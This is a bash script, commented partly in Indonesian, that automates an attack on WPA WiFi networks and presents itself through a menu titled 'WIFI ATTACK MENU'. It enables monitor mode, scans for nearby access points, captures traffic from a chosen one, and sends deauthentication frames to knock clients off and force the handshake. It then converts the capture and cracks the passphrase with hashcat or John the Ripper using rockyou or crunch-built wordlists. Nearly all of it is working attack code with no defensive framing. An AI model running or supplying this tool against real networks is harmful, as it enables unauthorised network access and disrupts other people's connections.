#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
NC="\e[0m"
capture_dir="captures"
tmp_prefix="scan_tmp"
log_file="betterui.log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Trap for cleanup only on normal exit, NOT on Ctrl+C
trap cleanup SIGINT SIGTERM

# Trap for cleanup on Ctrl+C
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}" | tee -a "$log_file"

    if [[ -n "$CAP_PID" ]]; then
        echo "[*] Killing capture process: $CAP_PID" | tee -a "$log_file"
        kill -9 "$CAP_PID" 2>/dev/null
    fi

    if [[ -n "$DEAUTH_LOOP_PID" ]]; then
        echo "[*] Killing deauth loop process: $DEAUTH_LOOP_PID" | tee -a "$log_file"
        kill -9 "$DEAUTH_LOOP_PID" 2>/dev/null
    fi

    if [[ -n "$iface" ]]; then
        echo "[*] Resetting interface $iface to managed mode..." | tee -a "$log_file"
        if [[ $EUID -ne 0 ]]; then
            sudo -n ip link set "$iface" down 2>/dev/null
            sudo -n iw "$iface" set type managed 2>/dev/null
            sudo -n ip link set "$iface" up 2>/dev/null
        else
            ip link set "$iface" down 2>/dev/null
            iw "$iface" set type managed 2>/dev/null
            ip link set "$iface" up 2>/dev/null
        fi
    fi

    echo "[*] Removing temp scan file..." | tee -a "$log_file"
    rm -f "$tmp_prefix-01.csv"

    echo -e "${GREEN}[+] Cleanup completed.${NC}" | tee -a "$log_file"

    # Tambahkan exit untuk benar-benar keluar setelah Ctrl+C
    exit 130
}

check_dependencies() {
    echo -e "${YELLOW}[*] Checking dependencies...${NC}" | tee -a "$log_file"
    required_tools=(airmon-ng airodump-ng aireplay-ng iw crunch hcxpcapngtool wpapcap2john john hashcat python3 git make gcc)
    missing=()
    jumbo_missing=0

    for tool in "${required_tools[@]}"; do
        if ! command -v $tool &>/dev/null; then
            missing+=("$tool")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing: ${missing[*]}${NC}" | tee -a "$log_file"
        echo -e "${YELLOW}[*] Installing missing packages...${NC}" | tee -a "$log_file"
        sudo apt update
        for dep in "${missing[@]}"; do
            sudo apt install -y "$dep"
        done
    fi

    # Cari john-jumbo di /opt, ~, atau ~/john
    john_jumbo_dir=$(find /opt ~/ ~/john -maxdepth 2 -type d -name "john-jumbo" 2>/dev/null | head -n1)
    [ -z "$john_jumbo_dir" ] && john_jumbo_dir=$(find ~/ ~/john /opt -maxdepth 2 -type d -name "john" 2>/dev/null | head -n1)
    [ -z "$john_jumbo_dir" ] && john_jumbo_dir="/opt/john-jumbo"

    hashcat2john_path="$john_jumbo_dir/run/hashcat2john.py"
    john_bin="$john_jumbo_dir/run/john"

    # Deteksi john lebih dulu sebelum clone
    if ! command -v john &>/dev/null; then
        # Jika john belum ada, baru clone
        if [[ ! -f "$john_bin" ]]; then
            echo -e "${YELLOW}[*] Cloning John the Ripper Jumbo...${NC}" | tee -a "$log_file"
            sudo rm -rf "$john_jumbo_dir"
            sudo git clone https://github.com/openwall/john.git "$john_jumbo_dir"
        fi
    fi

    # Symlink hashcat2john.py jika sudah ada
    if [[ -f "$hashcat2john_path" ]]; then
        sudo ln -sf "$hashcat2john_path" /usr/local/bin/hashcat2john.py
    fi

    # Jika hashcat2john.py tetap tidak ada, download manual dari GitHub
    if ! command -v hashcat2john.py &>/dev/null; then
        echo -e "${YELLOW}[*] hashcat2john.py not found after build, downloading from GitHub...${NC}" | tee -a "$log_file"
        wget -q -O /tmp/hashcat2john.py https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/hashcat2john.py
        chmod +x /tmp/hashcat2john.py
        sudo mv /tmp/hashcat2john.py /usr/local/bin/hashcat2john.py
    fi

    # Cek ulang hashcat2john.py
    if ! command -v hashcat2john.py &>/dev/null; then
        echo -e "${RED}[!] hashcat2john.py masih tidak ditemukan. WPA cracking dengan John tidak akan berfungsi.${NC}" | tee -a "$log_file"
        jumbo_missing=1
    fi

    # Cek WPA support
    if ! john --list=formats 2>/dev/null | grep -q "wpapsk"; then
        echo -e "${RED}[!] John the Ripper tidak support WPA (wpapsk).${NC}" | tee -a "$log_file"
        jumbo_missing=1
    fi

    if [ ${#missing[@]} -eq 0 ] && [ $jumbo_missing -eq 0 ]; then
        echo -e "${GREEN}[+] All dependencies are installed and WPA cracking is supported.${NC}" | tee -a "$log_file"
    fi
}

create_wordlist() {
    echo -e "${YELLOW}[*] Creating a custom wordlist using crunch (multi-core, numbers+letters after prefix)...${NC}" | tee -a "$log_file"
    echo -n "Enter prefix (must be < 8 characters): "; read prefix
    len=${#prefix}
    if (( len >= 8 )); then
        echo -e "${RED}[!] Prefix too long. Must be less than 8 characters.${NC}"
        return
    fi
    echo -n "Enter minimum length (>= ${len}): "; read min
    echo -n "Enter maximum length (>= min): "; read max
    if (( min < len )); then
        echo -e "${RED}[!] Minimum length must be at least the prefix length (${len}).${NC}"
        return
    fi
    if (( max < min )); then
        echo -e "${RED}[!] Maximum length must be greater than or equal to minimum length.${NC}"
        return
    fi
    echo -n "Enter output file name for wordlist (without extension): "; read wordlist_file
    if [[ "$wordlist_file" != *.txt ]]; then
        wordlist_file="${wordlist_file}.txt"
    fi

    output_path="$script_dir/$wordlist_file"

    # Estimasi ukuran file
    est_lines=$(crunch "$min" "$max" -t "${prefix}$(printf '%0.s@' $(seq 1 $((max-len))))" -u 2>/dev/null | grep -oP 'number of lines: \K[0-9]+')
    if [[ -n "$est_lines" && "$est_lines" -gt 10000000 ]]; then
        echo -e "${RED}[!] WARNING: Estimated $est_lines lines. This may take a long time and use a lot of disk space!${NC}"
        echo -n "Continue? (y/n): "; read jawab
        [[ "$jawab" != "y" ]] && return
    fi

    if (( min == max )); then
        # Satu panjang saja, tidak perlu parallel
        echo -e "${YELLOW}[*] Generating wordlist with crunch...${NC}" | tee -a "$log_file"
        crunch "$min" "$max" -t "${prefix}$(printf '%0.s@' $(seq 1 $((max-len))))" -o "$output_path" -f /usr/share/crunch/charset.lst mixalpha-numeric
    else
        mkdir -p "$script_dir/crunch_tmp"
        > "$output_path"
        echo -e "${YELLOW}[*] Generating wordlist from length $min to $max using parallel crunch...${NC}" | tee -a "$log_file"
        jobs=()
        for ((l = min; l <= max; l++)); do
            pattern="$prefix"
            pad_len=$((l - ${#prefix}))
            for ((i = 0; i < pad_len; i++)); do
                pattern+='@'
            done
            temp_file="$script_dir/crunch_tmp/part_$l.txt"
            crunch "$l" "$l" -t "$pattern" -o "$temp_file" -f /usr/share/crunch/charset.lst mixalpha-numeric &
            jobs+=($!)
        done
        for pid in "${jobs[@]}"; do
            wait "$pid"
        done
        echo -e "${YELLOW}[*] Merging all parts, please wait...${NC}"
        cat "$script_dir"/crunch_tmp/part_*.txt > "$output_path"
        rm -rf "$script_dir/crunch_tmp"
    fi

    echo -e "${GREEN}[+] Wordlist saved to $output_path${NC}" | tee -a "$log_file"
    wordlist_path="$output_path"
}

select_wordlist() {
    echo -n "Enter full path to your wordlist file (default: ./rockyou.txt): "; read input_path
    if [[ -z "$input_path" ]]; then
        if [[ -f "$script_dir/rockyou.txt" ]]; then
            wordlist_path="$script_dir/rockyou.txt"
        elif [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
            wordlist_path="/usr/share/wordlists/rockyou.txt"
        else
            echo -e "${RED}[!] rockyou.txt not found in current directory or /usr/share/wordlists.${NC}" | tee -a "$log_file"
            exit 1
        fi
    else
        wordlist_path="$input_path"
        if [[ ! -f "$wordlist_path" ]]; then
            echo -e "${RED}[!] Wordlist not found at $wordlist_path${NC}" | tee -a "$log_file"
            exit 1
        fi
    fi
    echo -e "${GREEN}[+] Using wordlist: $wordlist_path${NC}" | tee -a "$log_file"
}

select_interface() {
    interfaces=($(iw dev | awk '$1=="Interface"{print $2}'))
    echo -e "${GREEN}Available wireless interfaces:${NC}" | tee -a "$log_file"
    for i in "${!interfaces[@]}"; do
        echo "$((i+1))) ${interfaces[$i]}"
    done
    echo -n "Select interface number: "; read idx
    if (( idx < 1 || idx > ${#interfaces[@]} )); then
        echo -e "${RED}[!] Invalid selection.${NC}"
        exit 1
    fi
    iface="${interfaces[$((idx-1))]}"
    echo -e "${GREEN}Selected interface: $iface${NC}" | tee -a "$log_file"
}

enable_monitor_mode() {
    echo -e "${YELLOW}[*] Enabling monitor mode...${NC}" | tee -a "$log_file"
    if [[ $EUID -ne 0 ]]; then
        sudo ip link set $iface down
        sudo iw $iface set monitor control
        sudo ip link set $iface up
    else
        ip link set $iface down
        iw $iface set monitor control
        ip link set $iface up
    fi
    echo -e "${GREEN}[+] Monitor mode enabled.${NC}" | tee -a "$log_file"
}

scan_networks() {
    echo -e "${YELLOW}[*] Scanning networks for 15 seconds...${NC}" | tee -a "$log_file"
    sudo timeout 15s airodump-ng -w $tmp_prefix --output-format csv "$iface" > /dev/null 2>&1

    if [[ ! -f $tmp_prefix-01.csv ]]; then
        echo -e "${RED}[!] No scan result found. airodump-ng failed or no networks detected.${NC}" | tee -a "$log_file"
        echo -e "${YELLOW}[*] Make sure your interface is in monitor mode and try again.${NC}"
        return
    fi

    echo -e "\n${GREEN}Available Networks:${NC}" | tee -a "$log_file"

    AP_LIST=()
    IFS=$'\n'
    for line in $(grep -a -E "^([0-9A-F]{2}:){5}[0-9A-F]{2}," $tmp_prefix-01.csv | head -n 20); do
        bssid=$(echo $line | cut -d',' -f1 | xargs)
        channel=$(echo $line | cut -d',' -f4 | xargs)
        essid=$(echo $line | cut -d',' -f14 | xargs)
        if [[ -n "$bssid" && -n "$essid" ]]; then
            AP_LIST+=("$bssid|$channel|$essid")
            idx=${#AP_LIST[@]}
            echo "$idx) ESSID: $essid | BSSID: $bssid | CH: $channel"
        fi
    done
    unset IFS

    if [[ ${#AP_LIST[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No networks found. Try scanning again or move closer to an AP.${NC}"
        return
    fi

    echo -n "Pick AP number: "; read choice
    IFS='|' read bssid channel essid <<< "${AP_LIST[$((choice-1))]}"
    echo -n "Enter name for capture file: "; read filename
    mkdir -p "$capture_dir"
    cap_base="$capture_dir/$filename"

    echo -e "${YELLOW}[*] Capturing in .cap or .pcapng format (auto-detect)...${NC}" | tee -a "$log_file"
    airodump-ng --bssid "$bssid" -c "$channel" -w "$cap_base" --output-format pcapng "$iface" > "$log_file" 2>&1 &
    CAP_PID=$!

    sleep 3
    echo -e "${YELLOW}[*] Sending limited deauth...${NC}" | tee -a "$log_file"
    aireplay-ng --deauth 10 -a "$bssid" "$iface" >/dev/null 2>&1

    echo -e "${YELLOW}[*] Watching for EAPOL handshake...${NC}" | tee -a "$log_file"
    while kill -0 $CAP_PID 2>/dev/null; do
        if grep -q "EAPOL" "$log_file"; then
            echo -e "${GREEN}[+] EAPOL Handshake detected!${NC}" | tee -a "$log_file"
            kill $CAP_PID $DEAUTH_LOOP_PID 2>/dev/null
            break
        fi
        sleep 2
    done

    # Wait for handshake and kill capture
    echo -e "${YELLOW}[*] Waiting 10 seconds to capture handshake...${NC}" | tee -a "$log_file"
    sleep 10
    kill $CAP_PID 2>/dev/null

    # Detect both .pcapng and .cap files
    capfile="$(ls ${cap_base}-*.pcapng ${cap_base}-*.cap 2>/dev/null | head -n1)"
    echo "[*] Looking for: ${cap_base}-*.pcapng or ${cap_base}-*.cap"
    echo "[*] Found file: $capfile"
    if [[ -f "$capfile" ]]; then
        echo -e "${GREEN}[+] Handshake capture file found: $capfile${NC}" | tee -a "$log_file"
    else
        echo -e "${RED}[!] No .pcapng or .cap file found. Capture failed?${NC}" | tee -a "$log_file"
        return
    fi

    # Use correct conversion depending on file type
    HC22000_FILE="${capfile%.*}.hc22000"
    JOHN_FILE="${capfile%.*}.john"

    if [[ "$capfile" == *.pcapng ]]; then
        echo -e "${YELLOW}[*] Converting .pcapng to hc22000...${NC}"
        hcxpcapngtool "$capfile" -o "$HC22000_FILE"
    elif [[ "$capfile" == *.cap ]]; then
        echo -e "${YELLOW}[*] Converting .cap to hc22000...${NC}"
        hcxpcapngtool "$capfile" -o "$HC22000_FILE"
    fi

    echo ""
    echo "[?] Choose cracking method:"
    echo "1) Hashcat"
    echo "2) John the Ripper"
    echo "3) Both"
    read -p ">>> " method

    check_john_wpa() {
        john --list=formats 2>/dev/null | grep -q "wpapsk"
    }

    ensure_hashcat2john() {
        INSTALL_PATH="/usr/local/bin"
        TOOL_NAME="hashcat2john.py"

        if command -v "$TOOL_NAME" &> /dev/null || [[ -f "$INSTALL_PATH/$TOOL_NAME" ]]; then
            echo "[+] $TOOL_NAME is already installed and accessible."
            return 0
        fi

        echo "[*] Cloning John the Ripper Jumbo repository..."
        git clone https://github.com/openwall/john -b bleeding-jumbo /tmp/john-jumbo
        cd /tmp/john-jumbo/src

        echo "[*] Building John the Ripper..."
        ./configure && make -s clean && make -sj"$(nproc)"

        SCRIPT_PATH="/tmp/john-jumbo/run/$TOOL_NAME"
        if [[ ! -f "$SCRIPT_PATH" ]]; then
            echo "[!] $TOOL_NAME not found after build!"
            return 1
        fi

        echo "[*] Copying $TOOL_NAME to $INSTALL_PATH..."
        sudo cp "$SCRIPT_PATH" "$INSTALL_PATH/"
        sudo chmod +x "$INSTALL_PATH/$TOOL_NAME"

        # Optional: clean up
        # rm -rf /tmp/john-jumbo

        echo "[*] Verifying installation..."
        python3 "$TOOL_NAME" --help || echo "[!] Installed, but unable to run with python3. Check path or permissions."

        echo "[+] $TOOL_NAME has been installed and is globally accessible via: python3 $TOOL_NAME"
    }

    convert_to_john_format() {
        local hc22000_file="$1"
        local john_file="$2"
        if [ ! -f "$john_file" ]; then
            echo -e "${YELLOW}[*] Converting .hc22000 to .john...${NC}"
            ensure_hashcat2john
            HASHCAT2JOHN="$(command -v hashcat2john.py || echo /usr/local/bin/hashcat2john.py)"
            if [ ! -f "$HASHCAT2JOHN" ]; then
                echo -e "${RED}[!] hashcat2john.py not found after attempted install.${NC}"
                return 1
            fi
            python3 "$HASHCAT2JOHN" "$hc22000_file" > "$john_file"
        fi
    }

    run_hashcat() {
        local hc22000_file="$1"
        read -p "[?] Enter path to wordlist: " wordlist
        echo -e "${YELLOW}[*] Running Hashcat...${NC}"
        hashcat -m 22000 "$hc22000_file" "$wordlist" --force
        hashcat -m 22000 "$hc22000_file" --show
    }

    run_john() {
        local hc22000_file="$1"
        local john_file="$2"
        read -p "[?] Enter path to wordlist: " wordlist
        convert_to_john_format "$hc22000_file" "$john_file" || return
        echo -e "${YELLOW}[*] Running John the Ripper...${NC}"
        john --format=wpapsk --wordlist="$wordlist" "$john_file"
        john --show "$john_file"
    }

    case $method in
        1)
            run_hashcat "$HC22000_FILE"
            ;;
        2)
            if check_john_wpa; then
                run_john "$HC22000_FILE" "$JOHN_FILE"
            else
                echo -e "${RED}[!] Your john doesn't support WPA (wpapsk). Please install John Jumbo.${NC}"
            fi
            ;;
        3)
            run_hashcat "$HC22000_FILE"
            if check_john_wpa; then
                run_john "$HC22000_FILE" "$JOHN_FILE"
            else
                echo -e "${RED}[!] Skipping John (not supported).${NC}"
            fi
            ;;
        *)
            echo -e "${RED}[!] Invalid choice.${NC}"
            ;;
    esac

    echo "[?] Try John the Ripper directly on .pcapng? (y/n): "
    read try_john
    if [[ "$try_john" == "y" ]]; then
        if command -v wpapcap2john &>/dev/null; then
            wpapcap2john "$capfile" > "$JOHN_FILE"
            john --wordlist="$wordlist_path" "$JOHN_FILE"
            john --show "$JOHN_FILE"
            return
        else
            echo -e "${RED}[!] wpapcap2john not found. Skipping direct John test.${NC}"
        fi
    fi
}

main_menu() {
    while true; do
        echo
        echo "==== WIFI ATTACK MENU ===="
        echo "Wordlist in use: $wordlist_path"
        echo "1) Check Dependencies"
        echo "2) Create Wordlist"
        echo "3) Select Wordlist"
        echo "4) Capture & Crack Handshake"
        echo "5) Exit"
        echo "==========================="
        echo -n "Select: "; read opt
        case $opt in
            1) check_dependencies ;;
            2) create_wordlist ;;
            3) select_wordlist ;;
            4)
                select_interface
                enable_monitor_mode
                scan_networks
                ;;
            5) echo "Bye!"; exit 0 ;;
            *) echo "Invalid option." ;;
        esac
    done
}

clear
check_dependencies
select_wordlist
main_menu
